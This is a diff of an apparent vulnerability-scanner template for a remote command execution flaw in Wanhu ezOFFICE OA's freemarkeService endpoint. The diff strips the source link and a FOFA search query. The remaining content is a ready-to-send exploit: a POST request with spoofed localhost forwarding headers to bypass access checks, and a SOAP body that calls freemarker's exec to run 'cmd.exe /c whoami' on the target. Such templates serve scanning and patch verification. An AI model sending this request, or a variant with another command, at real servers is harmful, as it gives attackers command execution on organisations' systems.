@@ -3,12 +3,8 @@ info:
   name: 万户OA freemarkeService 存在远程命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/leo8ggikxl8o78sc'
+  description: ''
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: leo8ggikxl8o78sc
-    fofa: app="万户ezOFFICE协同管理平台"
 http:
 - raw:
   - "POST /defaultroot/services/./././freemarkeService HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.1739.87 Safari/537.36\nX-Remote-Addr: 127.0.0.1\nX-Remote-IP: 127.0.0.1\nX-Originating: 127.0.0.1\nX-Forwarded-For: 127.0.0.1\nContent-Type: text/xml; charset=utf-8\nConnection: close\n\n<soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n  xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"\n  xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\n  xmlns:util=\"http://utility.template.freemarker\"\n  xmlns:soapenc=\"http://schemas.xmlsoap.org/soap/encoding/\">\n  <soapenv:Header/>\n  <soapenv:Body>\n    <util:exec soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\n      <arguments xsi:type=\"xst:ArrayOf_xsd_anyType\" soapenc:arrayType=\"xsd:anyType[]\">\n        <cmd xsi:type=\"soapenc:string\">c:\\windows\\system32\\cmd.exe /c whoami</cmd>\n      </arguments>\n    </util:exec>\n  </soapenv:Body>\n</soapenv:Envelope>"
